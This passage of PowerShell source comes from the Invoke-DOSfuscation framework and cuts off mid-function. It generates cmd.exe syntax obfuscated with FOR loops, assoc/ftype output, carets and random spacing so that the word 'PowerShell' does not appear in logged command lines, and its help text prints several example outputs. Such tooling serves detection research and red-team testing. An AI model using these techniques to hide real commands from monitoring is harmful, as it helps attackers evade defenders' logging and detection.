                    $randomSpace4 = $randomCharE
                }
                else
                {
                    # Equal characters in the FINDSTR argument need to be escaped with a caret.
                    if ($valuePairing.FindVal.Contains('='))
                    {
                        $valuePairing.FindVal = $valuePairing.FindVal.Replace('=','^=')
                    }
                }

                # Add random carets if -RandomCaret or -DoubleEscape switch is set.
                if ($RandomCaret.IsPresent -or $DoubleEscape.IsPresent)
                {
                    # FIND interprets carets as escapes in a regex term, so only add caret obfuscation if $subFind is FINDSTR.
                    if ($subFind.Replace('^','') -ieq 'findstr')
                    {
                        # Randomly decide to escape the '=' character if it is present since Out-ObfuscatedCaret will not escape this character.
                        if ((Get-Random -InputObject @(0..1)) -and -not $valuePairing.FindVal.Contains('^='))
                        {
                            $valuePairing.FindVal = $valuePairing.FindVal.Replace('=','^=')
                        }

                        $valuePairing.FindVal = Out-ObfuscatedCaret -StringToObfuscate $valuePairing.FindVal -RandomCaretPercent:$RandomCaretPercent
                    }
                }

                # Double escape caret characters in $valuePairing.FindVal if -DoubleEscape switch is set.
                if ($DoubleEscape.IsPresent)
                {
                    $valuePairing.FindVal = $valuePairing.FindVal.Replace('^','^^').Replace('^^=','^^^=')
                }

                # Assemble the sub-command that will produce output in cmd.exe that contains "cmd".
                $subCommand = "$randomCharA$set$randomCharB^|$randomCharC$subFind$randomCharD$quotes$($valuePairing.FindVal)$quotes$randomSpace4"
            }
        }
        default {
            Write-Warning "Undefined `$ObfuscationType ($ObfuscationType) in switch statement."
            
            return $null
        }
    }

    # Select random token value.
    $randomTokenValue = Get-Random -InputObject $tokenValues

    # Randomly add explicit '+' or '-' sign to positive tokens value if -RandomChar is selected.
    $randomPlusOrMinusSign  = ''
    if ($RandomChar.IsPresent -and ((Get-Random -InputObject @(1..100)) -le $RandomCharPercent))
    {
        if ($randomTokenValue -eq 0)
        {
            $randomPlusOrMinusSign = Get-Random -InputObject @('-','+')
        }
        elseif ($randomTokenValue -gt 0)
        {
            $randomPlusOrMinusSign = '+'
        }
    }

    # Add tokens and delims placeholder value names with randomly-selected values generated in above switch block.
    $tokenValue = "tokens=$randomSpaceA$randomPlusOrMinusSign$randomTokenValue"
    $delimValue = "delims=" + (-join (Get-Random -InputObject $delimValues -Count $delimValues.Count))

    # Rejoin above delim and token values with random whitespace in between and encapsulating if -RandomSpace argument is selected.
    $tokenDelimRandomStr = (Get-Random -InputObject @($tokenValue,$delimValue) -Count 2) -join ' '
    if ($RandomSpace.IsPresent)
    {
        # Do not add extra whitespace after $delimValue if it is listed after $tokenValue as this whitespace will then be part of the delim value(s) and cause errors depending on the token value(s).
        if (Get-Random -InputObject @(0..1))
        {
            # Whitespace is not necessary between $tokenValue and $delimValue but the inverse is not true. To maintain more normal appearances default to single space if -RandomSpace argument is not selected.
            if (-not $RandomSpace.IsPresent)
            {
                $randomSpace3 = ' '
            }
            $tokenDelimRandomStr = "$randomSpace1$tokenValue$randomSpace3$delimValue"
        }
        else
        {
            $tokenDelimRandomStr = "$randomSpace1$delimValue$randomSpace2$tokenValue$randomSpace3"
        }
    }

    # Assemble all components into final obfuscated syntax.
    $obfuscatedCmd = "$for$randomChar1/$f$randomChar2`"$tokenDelimRandomStr`"$randomChar3%$VarName$randomChar4$in$randomChar5($randomChar6'$subCommand'$randomChar7)$randomChar8$do$randomChar9%$VarName"
    
    # Return final result.
    return $obfuscatedCmd
}


function Get-ObfuscatedPowerShell
{
<#
.SYNOPSIS

Get-ObfuscatedPowerShell returns properly escaped intricate syntax that resolves to "PowerShell" in memory but not on the command line (except for "env" option). It relies on numerous methods supported by cmd.exe including:
    1) substring capabilities in the context of environment variables
    2) SET, ASSOC and FTYPE native commands for producing output containing "PowerShell"
    3) FIND and FINDSTR for selecting line in output containing "PowerShell"
    4) FOR loop for setting native command output as an environment variable
    5) FOR loop delims and tokens arguments for extracting "PowerShell" from output
    6) optional randomized casing
    7) optional whitespace obfuscation
    8) optional caret (and double-caret) obfuscation

Invoke-DOSfuscation Function: Get-ObfuscatedPowerShell
Author: Daniel Bohannon (@danielhbohannon)
License: Apache License, Version 2.0
Required Dependencies: Out-RandomCase, Out-ObfuscatedCaret, Get-RandomWhitespaceAndRandomChar, Out-EnvVarEncodedCommand (all located in Invoke-DOSfuscation.psm1)
Optional Dependencies: None
 
.DESCRIPTION

Get-ObfuscatedPowerShell returns properly escaped intricate syntax that resolves to "PowerShell" in memory but not on the command line (except for "env" option)

.PARAMETER ObfuscationLevel

(Optional) Specifies the preset obfuscation "profile" of all below parameters. This is to simplify general usage of this function without becoming overwhelmed by all of the options.

.PARAMETER ObfuscationType

(Optional) Specifies the obfuscation type to produce "PowerShell":
1) env (environment variable substring encoding)
2) assoc (FOR loop + assoc w/optional FIND/FINDSTR)
3) ftype (FOR loop + ftype w/optional FIND/FINDSTR)
4) set (FOR loop + set w/optional FIND/FINDSTR)

.PARAMETER VarName

(Optional) Specifies the single alphanumeric character for the FOR loop variable name (not used in the "env" option).

.PARAMETER RandomCase

(Optional) Specifies that random casing be used wherever possible.

.PARAMETER RandomSpace

(Optional) Specifies that random whitespace be input wherever possible.

.PARAMETER RandomSpaceRange

(Optional) Specifies the range of the length of each randomly-selected whitespace if -RandomSpace is also selected.

.PARAMETER RandomChar

(Optional) Specifies that random commas and semicolons be input wherever possible in the command.

.PARAMETER RandomCharRange

(Optional) Specifies the range of the count of commas and semicolons to be input wherever possible in the command if -RandomChar is also selected.

.PARAMETER RandomCharArray

(Optional) Specifies the character or array of characters (only comma and semicolon) to use if -RandomChar is also selected.

.PARAMETER RandomCaret

(Optional) Specifies that random carets be added before non-escapable characters in syntax components not affected by caret escape characters.

.PARAMETER RandomCaretPercent

(Optional) Specifies the percentage of characters to obfuscate with caret escape characters if -RandomCaret is also selected.

.PARAMETER DoubleEscape

(Optional) Specifies that double caret escaping occur for eligible components of the FOR loop sub-command so one layer of caret escapes will persist into the execution of the child process(es) of the sub-command.

.EXAMPLE

C:\PS> Get-ObfuscatedPowerShell

FOR /F "delims=N8WLC. tokens=2" %6 IN ('ftype^|find "lCo"')DO %6

.EXAMPLE

C:\PS> Get-ObfuscatedPowerShell -ObfuscationLevel 3

F^O^R    ;    ;  ,   ;   /^f   ;   ;  ,  ,   ,   ,   "      delims=F.C   tokens=    2       "  ,    ;  ;   ,   %j    ;   ;   ;   ;  ,   ^in  ;  ,    ,   ;    ;   ,   (   ,    ;  ;   ,   ;   ;  ,  '   ,  ;    ;   ;   ;  ,    ,  ^^A^^s^^S^^O^^C  ;    ,   ;   ^^.c^^dx^^m^^l   '  ;   ,   ,  ,  )   ;   ;  ;   ;  ,   ^D^O  ;   ,   ;   %j

.EXAMPLE

C:\PS> Get-ObfuscatedPowerShell -ObfuscationType env -RandomCase -RandomSpace -RandomSpaceRange @(2..5) -RandomCaret -RandomCaretPercent 25

P^O%winDir:~    8,    -1%e^RS^H%prOGRAmfilES(x86):~  14,     -7%%SESSiONnaMe:~     -2,     -1%^L

.EXAMPLE

C:\PS> Get-ObfuscatedPowerShell -ObfuscationType assoc -RandomCase -RandomSpace -RandomSpaceRange @(2..5) -RandomCaret -RandomCaretPercent 75 -RandomChar -RandomCharRange @(2..5) -DoubleEscape

^f^oR   ;  ;  ;  ;  /^f ;  ;  ;  ;  "  tokens=  3  delims=xD5d."  ;   ;   %o  ;  ;   ^in   ; ; (  ; ;   ;  ; ' ;  ;  ;  ;  ^^a^^s^^S^^o^^C  ;  ;  ;   ;   ;   ^^.^^p^^s^^d^^1  '   ;   ;   ;  ;  )   ;  ;   ^d^O ;  ;  ;  ;  %o

.EXAMPLE

C:\PS> Get-ObfuscatedPowerShell -ObfuscationType ftype -RandomCase -RandomSpace -RandomSpaceRange @(2..5) -RandomCaret -RandomCaretPercent 75 -RandomChar -RandomCharRange @(2..5) -DoubleEscape

^F^o^r ;  ;  ; ;   ;  /^F  ;   ;   ;   ;  ;  "     delims=sum\i  tokens=    12   "  ;   ;  %k  ; ;  ; ; ;  ^IN ;  ;  ;   ; ;  (   ;  ;  '   ;  ;   ;  ^^F^^T^^Y^^p^^e  ; ; ^| ; ;  ;  ^^f^^iN^^D^^STR  ;  ;  ;  l^^C^^o    '  ;  ;  )  ;  ;   ; ^d^O   ;  ; ;  ;  %k

.EXAMPLE

C:\PS> Get-ObfuscatedPowerShell -ObfuscationType set -RandomCase -RandomSpace -RandomSpaceRange @(2..5) -RandomCaret -RandomCaretPercent 75 -RandomChar -RandomCharRange @(2..5) -DoubleEscape

^F^O^r  ;  ; /^F   ;   ;   ;   "     delims=siQOd\    tokens=    8  "   ;  ;  ; ;  %f ;  ;  ; ^in ;  ;  ; (  ;   ;   ;  ;  '  ;  ;  ;   ;   ;  ^^s^^e^^T   ;  ;  PSM  ' ;   ;  ;  ; ;   )   ;  ; ;   ;  ;  ^d^o  ;  ;   ;   ; %f

.NOTES

This is a personal project developed by Daniel Bohannon while an employee at MANDIANT, A FireEye Company.

.LINK

http://www.danielbohannon.com
#>
        
    [CmdletBinding()]
    [OutputType('System.String')]
    param (
        [Parameter(Position = 0, Mandatory = $false)]
        [ValidateSet(1,2,3)]
        [System.Int16]
        $ObfuscationLevel,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [ValidateSet('env','assoc','ftype','set')]
        [System.String]
        $ObfuscationType = (Get-Random -InputObject @('assoc','ftype')),
        
        [Parameter(Position = 0, Mandatory = $false)]
        [ValidateSet('A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','0','1','2','3','4','5','6','7','8','9')]
        [System.Char]
        $VarName = (Get-Random -InputObject ([System.Char[]] (@(48..57) + @(65..90) + @(97..122)))),
        
        [Parameter(Position = 0, Mandatory = $false)]
        [Switch]
        $RandomCase,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [Switch]
        $RandomSpace,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [ValidateScript( { ($_ | sort-object | select-object -First 1) -ge 0 } )]
        [System.Object[]]
        $RandomSpaceRange = @(0..4),
        
        [Parameter(Position = 0, Mandatory = $false)]
        [Switch]
        $RandomChar,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [ValidateScript( { ($_ | sort-object | select-object -First 1) -ge 0 } )]
        [System.Object[]]
        $RandomCharRange = @(1..5),
        
        [Parameter(Position = 0, Mandatory = $false)]
        [ValidateScript( { ($_ | where-object { @(',',';','(',')') -contains $_ }) -or ($_ | where-object { ($_.Count -eq 2) -and (@(',',';') -contains $_[0]) -and (@(',',';') -contains $_[1]) }) } )]
        [System.Object[]]
        $RandomCharArray = (Get-Random -InputObject @(@(','),@(';'),@(',',';'))),
        
        [Parameter(Position = 0, Mandatory = $false)]
        [Switch]
        $RandomCaret,
           
        [Parameter(Position = 0, Mandatory = $false)]
        [ValidateScript( { ($_ -ge 0) -and ($_ -le 100) } )]
        [System.Int16]
        $RandomCaretPercent = 50,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [Switch]
        $DoubleEscape
    )

    # Create "profiles" depending on -ObfuscationLevel value. This is to simplify general usage of this function without becoming overwhelmed by all of the options.
    if ($ObfuscationLevel)
    {
        switch ($ObfuscationLevel)
        {
            '1' {
                $ObfuscationType = 'env'
                $RandomCase      = $false
                $RandomSpace     = $false
                $RandomChar      = $false
                $RandomCaret     = $false
                $DoubleEscape    = $false
            }
            '2' {
                $ObfuscationType = Get-Random -InputObject @('assoc','ftype')
                $RandomCase      = $false
                $RandomSpace     = $false
                $RandomChar      = $false
                $RandomCaret     = $false
                $DoubleEscape    = $false
            }
            '3' {
                $ObfuscationType    = Get-Random -InputObject @('assoc','ftype')
                $RandomCase         = $true
                $RandomSpace        = $true
                $RandomSpaceRange   = @(3..7)
                $RandomChar         = $true
                $RandomCharRange    = @(3..7)
                $RandomCharArray    = @(',',';')
                $RandomCaret        = $true
                $RandomCaretPercent = Get-Random -InputObject @(65..85)
                $DoubleEscape       = $true
            }
        }
    }

    # Set random case values if -RandomCase switch is set.
    $for     = 'FOR'
    $f       = 'F'
    $tokens  = 'tokens'
    $delims  = 'delims'
    $in      = 'IN'
    $do      = 'DO'
    $find    = 'find'
    $findstr = 'findstr'
    $assoc   = 'assoc'
    $ftype   = 'ftype'
    $set     = 'set'
    if ($RandomCase.IsPresent)
    {
        $for     = Out-RandomCase $for
        $f       = Out-RandomCase $f
        $tokens  = Out-RandomCase $tokens
        $delims  = Out-RandomCase $delims
        $in      = Out-RandomCase $in
        $do      = Out-RandomCase $do
        $find    = Out-RandomCase $find
        $findstr = Out-RandomCase $findstr
        $assoc   = Out-RandomCase $assoc
        $ftype   = Out-RandomCase $ftype
        $set     = Out-RandomCase $set
    }

    # Add random carets if -RandomCaret switch is set.
    if ($RandomCaret.IsPresent)
    {
        $for = Out-ObfuscatedCaret -StringToObfuscate $for -RandomCaretPercent:$RandomCaretPercent
        $f   = Out-ObfuscatedCaret -StringToObfuscate $f   -RandomCaretPercent:$RandomCaretPercent
        $in  = Out-ObfuscatedCaret -StringToObfuscate $in  -RandomCaretPercent:$RandomCaretPercent
        $do  = Out-ObfuscatedCaret -StringToObfuscate $do  -RandomCaretPercent:$RandomCaretPercent
    }
    
    # Add random carets if -RandomCaret or -DoubleEscape switch is set.
    if ($RandomCaret.IsPresent -or $DoubleEscape.IsPresent)
    {
        $find    = Out-ObfuscatedCaret -StringToObfuscate $find    -RandomCaretPercent:$RandomCaretPercent
        $findstr = Out-ObfuscatedCaret -StringToObfuscate $findstr -RandomCaretPercent:$RandomCaretPercent
        $assoc   = Out-ObfuscatedCaret -StringToObfuscate $assoc   -RandomCaretPercent:$RandomCaretPercent
        $ftype   = Out-ObfuscatedCaret -StringToObfuscate $ftype   -RandomCaretPercent:$RandomCaretPercent
        $set     = Out-ObfuscatedCaret -StringToObfuscate $set     -RandomCaretPercent:$RandomCaretPercent
    }
    
    # Double escape caret characters in sub-command components if -DoubleEscape switch is set.
    if ($DoubleEscape.IsPresent)
    {
        $find    =    $find.Replace('^','^^')
        $findstr = $findstr.Replace('^','^^')
        $assoc   =   $assoc.Replace('^','^^')
        $ftype   =   $ftype.Replace('^','^^')
        $set     =     $set.Replace('^','^^')
    }

    # Set random whitespace values if -RandomSpace switch is set.
    $randomSpaceA = ''
    $randomSpace1 = ''
    $randomSpace2 = ''
    $randomSpace3 = ''
    $randomSpace4 = ''
    if ($RandomSpace.IsPresent)
    {
        $randomSpaceA = ' ' * (Get-Random -InputObject $RandomSpaceRange)
        $randomSpace1 = ' ' * (Get-Random -InputObject $RandomSpaceRange)
        $randomSpace2 = ' ' * (Get-Random -InputObject $RandomSpaceRange)
        $randomSpace3 = ' ' * (Get-Random -InputObject $RandomSpaceRange)
        $randomSpace4 = ' ' * (Get-Random -InputObject $RandomSpaceRange)
    }

    # Get random commas and/or semicolons (and whitespace mixed in if -RandomSpace is also selected).'
    $randomCharA = Get-RandomWhitespaceAndRandomChar -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray
    $randomCharB = Get-RandomWhitespaceAndRandomChar -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray
    $randomCharC = Get-RandomWhitespaceAndRandomChar -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray
    $randomCharD = Get-RandomWhitespaceAndRandomChar -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray
    $randomCharE = Get-RandomWhitespaceAndRandomChar -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray
    $randomChar1 = Get-RandomWhitespaceAndRandomChar -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray
    $randomChar2 = Get-RandomWhitespaceAndRandomChar -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray
    $randomChar3 = Get-RandomWhitespaceAndRandomChar -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray
    $randomChar4 = Get-RandomWhitespaceAndRandomChar -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray
    $randomChar5 = Get-RandomWhitespaceAndRandomChar -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray
    $randomChar6 = Get-RandomWhitespaceAndRandomChar -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray
    $randomChar7 = Get-RandomWhitespaceAndRandomChar -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray
    $randomChar8 = Get-RandomWhitespaceAndRandomChar -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray
    $randomChar9 = Get-RandomWhitespaceAndRandomChar -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray
    
    # Ensure specific $randomChar* variables are at least one whitespace if they are not defined.
    if (-not $randomSpace2) { $randomSpace2 = ' ' }
    if (-not $randomCharD)  { $randomCharD  = ' ' }
    if (-not $randomChar1)  { $randomChar1  = ' ' }
    if (-not $randomChar2)  { $randomChar2  = ' ' }
    if (-not $randomChar3)  { $randomChar3  = ' ' }
    if (-not $randomChar4)  { $randomChar4  = ' ' }
    if (-not $randomChar5)  { $randomChar5  = ' ' }
    if (-not $randomChar9)  { $randomChar9  = ' ' }

    # Randomly select between FINDSTR and FIND (adding double quotes around $subFindVal later via $quotes variable if FIND is selected).
    if (Get-Random -InputObject @(0..1))
    {
        $subFind = $findstr
        $quotes = ''
    }
    else
    {
        $subFind = $find
        $quotes = '"'
    }

    # Set core components of intricate syntax per -ObfuscationType option.
    $tokenValues = @()
    $delimValues = @()
    switch ($ObfuscationType)
    {
        'env' {
            # Calculate percentage of characters to substitute with environment variable substring syntax.
            $envVarPercent = $RandomCaretPercent
            
            # Retrieve environment variable encoded version of $stringToEncode below calling Out-EnvVarEncodedCommand up to $tryLimit times to increases the likelihood that some encoding actually takes place, particularly for low -EnvVarPercent values.
            $stringToEncode = 'PowerShell'
            $tryLimit = 5
            $tryCount = 0
            do
            {
                $finalResult = Out-EnvVarEncodedCommand -StringToEncode $stringToEncode -EnvVarPercent $envVarPercent -RandomCase:$RandomCase -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomCaret:$RandomCaret -RandomCaretPercent:$RandomCaretPercent -DoubleEscape:$DoubleEscape
                $tryCount++
            }
            while (($finalResult -eq $stringToEncode) -and ($tryCount -lt $tryLimit))
            
            # Since there is no FOR LOOP syntax required for the env option of this function we will return the result from this switch statement instead of proceeding like the rest of the options necessitate.
            return $finalResult
        }
        'assoc' {
            # Randomly choose between assoc+file extension and assoc+find/findstr syntaxes.
            if (Get-Random -InputObject @(0..1))
            {
                # Set value pairings for retrieving "PowerShell" with assoc command.
                $valuePairings  = @()
                $valuePairings += @{ Extension = '.cdxml';  RequiredDelims = @('.','C'); SearchTerm = 'PowerShell'; Output = '.cdxml=Microsoft.PowerShellCmdletDefinitionXML.1' }
                $valuePairings += @{ Extension = '.ps1xml'; RequiredDelims = @('.','X'); SearchTerm = 'PowerShell'; Output = '.ps1xml=Microsoft.PowerShellXMLData.1' }
                $valuePairings += @{ Extension = '.psc1';   RequiredDelims = @('.','C'); SearchTerm = 'PowerShell'; Output = '.psc1=Microsoft.PowerShellConsole.1' }
                $valuePairings += @{ Extension = '.psd1';   RequiredDelims = @('.','D'); SearchTerm = 'PowerShell'; Output = '.psd1=Microsoft.PowerShellData.1' }
                $valuePairings += @{ Extension = '.psm1';   RequiredDelims = @('.','M'); SearchTerm = 'PowerShell'; Output = '.psm1=Microsoft.PowerShellModule.1' }

                # Select random pairing values from above.
                $valuePairing = Get-Random -InputObject $valuePairings

                # Retrieve all alpha-numeric characters that are case-sensitive unique to the characters found in $valuePairings.SearchTerm and then add random characters to $delimValues mix for more randomization of delim values and potentially resultant tokens value.
                $nonConflictingChars = [System.Char[]] (@(48..57) + @(65..90) + @(97..122)) | where-object { [System.Char[]] ($valuePairing.SearchTerm + $valuePairing.RequiredDelims) -cnotcontains $_ }
                $delimValues = $valuePairing.RequiredDelims + (Get-Random -InputObject $nonConflictingChars -Count (Get-Random -InputObject @(1..4)))

                # Randomize order of $delimValues.
                $delimValues = Get-Random -InputObject $delimValues -Count $delimValues.Count

                # Since the search term (file extension) used by assoc imposes its case on the output result we will perform this case-insensitive substitution since it will affect the tokens index value(s).
                $valuePairing.Output = $valuePairing.Output -ireplace [Regex]::Escape($valuePairing.Extension),$valuePairing.Extension

                # Retrieve all matching tokens index values from assoc output, required+randomly-selected delim values and search term.
                $tokenValues = Get-Index -Delims $delimValues -Output $valuePairing.Output -SearchTerm $valuePairing.SearchTerm

                # Add random carets if -RandomCaret or -DoubleEscape switch is set.
                if ($RandomCaret.IsPresent -or $DoubleEscape.IsPresent)
                {
                    # FIND interprets carets as escapes in a regex term, so only add caret obfuscation if $subFind is FINDSTR.
                    if ($subFind.Replace('^','') -ieq 'findstr')
                    {
                        # Randomly decide to escape the '=' character if it is present since Out-ObfuscatedCaret will not escape this character.
                        if ((Get-Random -InputObject @(0..1)) -and -not $valuePairing.Extension.Contains('^='))
                        {
                            $valuePairing.Extension = $valuePairing.Extension.Replace('=','^=')
                        }
        
                        $valuePairing.Extension = Out-ObfuscatedCaret -StringToObfuscate $valuePairing.Extension -RandomCaretPercent:$RandomCaretPercent
                    }
                }

                # Double escape caret characters in $valuePairing.Extension if -DoubleEscape switch is set.
                if ($DoubleEscape.IsPresent)
                {
                    $valuePairing.Extension = $valuePairing.Extension.Replace('^','^^').Replace('^^=','^^^=')
                }

                # Assemble the sub-command that will produce output in cmd.exe that contains "PowerShell".
                $subCommand = "$randomCharA$assoc$randomCharB$($valuePairing.Extension)$randomSpace4"
            }
            else
            {
                # Randomly select from find/findstr query values that return specific output containing "PowerShell".
                $findValCdxml  = Get-Random -InputObject @('cdxm','cdxml','llCm','lCm','lCmd','Cmdl','onX','nX','nXM','onXM')
                $findValPs1xml = Get-Random -InputObject @('1x','1xm','1xml','s1x','lX','llX','ellX','lXM','LD','LDat','MLD')
                $findValPsc1   = Get-Random -InputObject @('c1','c1=','sc1','lCo','llCon','ole.1','sole.','Cons','ons','nso')
                $findValPsd1   = Get-Random -InputObject @('sd1','d1','sd1=','d1=','llD','lDa','llDa','lDat','lData')
                $findValPsm1   = Get-Random -InputObject @('sm1','m1','sm1=','m1=','m1=M','lM','lMo','lMod','ellMo','hellM')

                # Set value pairings for retrieving "PowerShell" with assoc+find/findstr command.
                $valuePairings  = @()
                $valuePairings += @{ FindVal = $findValCdxml;  RequiredDelims = @('.','C'); SearchTerm = 'PowerShell'; Output = '.cdxml=Microsoft.PowerShellCmdletDefinitionXML.1' }
                $valuePairings += @{ FindVal = $findValPs1xml; RequiredDelims = @('.','X'); SearchTerm = 'PowerShell'; Output = '.ps1xml=Microsoft.PowerShellXMLData.1' }
                $valuePairings += @{ FindVal = $findValPsc1;   RequiredDelims = @('.','C'); SearchTerm = 'PowerShell'; Output = '.psc1=Microsoft.PowerShellConsole.1' }
                $valuePairings += @{ FindVal = $findValPsd1;   RequiredDelims = @('.','D'); SearchTerm = 'PowerShell'; Output = '.psd1=Microsoft.PowerShellData.1' }
                $valuePairings += @{ FindVal = $findValPsm1;   RequiredDelims = @('.','M'); SearchTerm = 'PowerShell'; Output = '.psm1=Microsoft.PowerShellModule.1' }

                # Select random pairing values from above.
                $valuePairing = Get-Random -InputObject $valuePairings

                # Retrieve all alpha-numeric characters that are case-sensitive unique to the characters found in $valuePairings.SearchTerm and then add random characters to $delimValues mix for more randomization of delim values and potentially resultant tokens value.
                $nonConflictingChars = [System.Char[]] (@(48..57) + @(65..90) + @(97..122)) | where-object { [System.Char[]] ($valuePairing.SearchTerm + $valuePairing.RequiredDelims) -cnotcontains $_ }
                $delimValues = $valuePairing.RequiredDelims + (Get-Random -InputObject $nonConflictingChars -Count (Get-Random -InputObject @(1..4)))

                # Randomize order of $delimValues.
                $delimValues = Get-Random -InputObject $delimValues -Count $delimValues.Count

                # Retrieve all matching tokens index values from assoc output, required+randomly-selected delim values and search term.
                $tokenValues = Get-Index -Delims $delimValues -Output $valuePairing.Output -SearchTerm $valuePairing.SearchTerm

                # If FIND is being used versus FINDSTR then add random characters at the end instead of whitespace.
                if ($subFind.Replace('^','') -ieq 'find')
                {
                    $randomSpace4 = $randomCharE
                }
                else
                {
                    # Equal characters in the FINDSTR argument need to be escaped with a caret.
                    if ($valuePairing.FindVal.Contains('='))
                    {
                        $valuePairing.FindVal = $valuePairing.FindVal.Replace('=','^=')
                    }
                }

                # Add random carets if -RandomCaret or -DoubleEscape switch is set.
                if ($RandomCaret.IsPresent -or $DoubleEscape.IsPresent)
                {
                    # FIND interprets carets as escapes in a regex term, so only add caret obfuscation if $subFind is FINDSTR.
                    if ($subFind.Replace('^','') -ieq 'findstr')
                    {
                        # Randomly decide to escape the '=' character if it is present since Out-ObfuscatedCaret will not escape this character.
                        if ((Get-Random -InputObject @(0..1)) -and -not $valuePairing.FindVal.Contains('^='))
                        {
                            $valuePairing.FindVal = $valuePairing.FindVal.Replace('=','^=')
                        }
        
                        $valuePairing.FindVal = Out-ObfuscatedCaret -StringToObfuscate $valuePairing.FindVal -RandomCaretPercent:$RandomCaretPercent
                    }
                }

                # Double escape caret characters in $valuePairing.FindVal if -DoubleEscape switch is set.
                if ($DoubleEscape.IsPresent)
                {
                    $valuePairing.FindVal = $valuePairing.FindVal.Replace('^','^^').Replace('^^=','^^^=')
                }

                # Assemble the sub-command that will produce output in cmd.exe that contains "PowerShell".
                $subCommand = "$randomCharA$assoc$randomCharB^|$randomCharC$subFind$randomCharD$quotes$($valuePairing.FindVal)$quotes$randomSpace4"
            }
        }
        'ftype' {
            # Randomly select from find/findstr query values that return specific output containing "PowerShell".
            $findValConsole = Get-Random -InputObject @('lCo','llCon','Cons','ons','nso','sol','sole.','ll\','l\v','v1','v1.')
            $findValData    = Get-Random -InputObject @('ellD','lDa','llDa','lDat','lData','a.1','ta.1','a.1=')
            $findValModule  = Get-Random -InputObject @('lM','lMo','lMod','ellMo','hellM')

            # PSConsole has "PowerShell" (case-sensitive) twice in its result, so randomly select required delimiter values for each instance.
            $consoleRequiredDelims = Get-Random -InputObject @(@('.','C'),@('s','\'))
                
            # Set value pairings for retrieving "PowerShell" with ftype+find/findstr command.
            $valuePairings  = @()
            $valuePairings += @{ FindVal = $findValConsole; RequiredDelims = @('.','\');             SearchTerm = 'powershell'; Output = 'Microsoft.PowerShellConsole.1="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -p "%1"' }
            $valuePairings += @{ FindVal = $findValConsole; RequiredDelims = $consoleRequiredDelims; SearchTerm = 'PowerShell'; Output = 'Microsoft.PowerShellConsole.1="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -p "%1"' }
            $valuePairings += @{ FindVal = $findValData;    RequiredDelims = @('.','D');             SearchTerm = 'PowerShell'; Output = 'Microsoft.PowerShellData.1="C:\Windows\System32\notepad.exe" "%1"' }
            $valuePairings += @{ FindVal = $findValModule;  RequiredDelims = @('.','M');             SearchTerm = 'PowerShell'; Output = 'Microsoft.PowerShellModule.1="C:\Windows\System32\notepad.exe" "%1"' }

            # Select random pairing values from above.
            $valuePairing = Get-Random -InputObject $valuePairings

            # Retrieve all alpha-numeric characters that are case-sensitive unique to the characters found in $valuePairings.SearchTerm and then add random characters to $delimValues mix for more randomization of delim values and potentially resultant tokens value.
            $nonConflictingChars = [System.Char[]] (@(48..57) + @(65..90) + @(97..122)) | where-object { [System.Char[]] ($valuePairing.SearchTerm + $valuePairing.RequiredDelims) -cnotcontains $_ }
            $delimValues = $valuePairing.RequiredDelims + (Get-Random -InputObject $nonConflictingChars -Count (Get-Random -InputObject @(1..4)))

            # Randomize order of $delimValues.
            $delimValues = Get-Random -InputObject $delimValues -Count $delimValues.Count

            # Retrieve all matching tokens index values from ftype output, required+randomly-selected delim values and search term.
            $tokenValues = Get-Index -Delims $delimValues -Output $valuePairing.Output -SearchTerm $valuePairing.SearchTerm

            # If FIND is being used versus FINDSTR then add random characters at the end instead of whitespace.
            if ($subFind.Replace('^','') -ieq 'find')
            {
                $randomSpace4 = $randomCharE
            }
            else
            {
                # Equal characters in the FINDSTR argument need to be escaped with a caret.
                if ($valuePairing.FindVal.Contains('='))
                {
                    $valuePairing.FindVal = $valuePairing.FindVal.Replace('=','^=')
                }
            }

            # Add random carets if -RandomCaret or -DoubleEscape switch is set.
            if ($RandomCaret.IsPresent -or $DoubleEscape.IsPresent)
            {
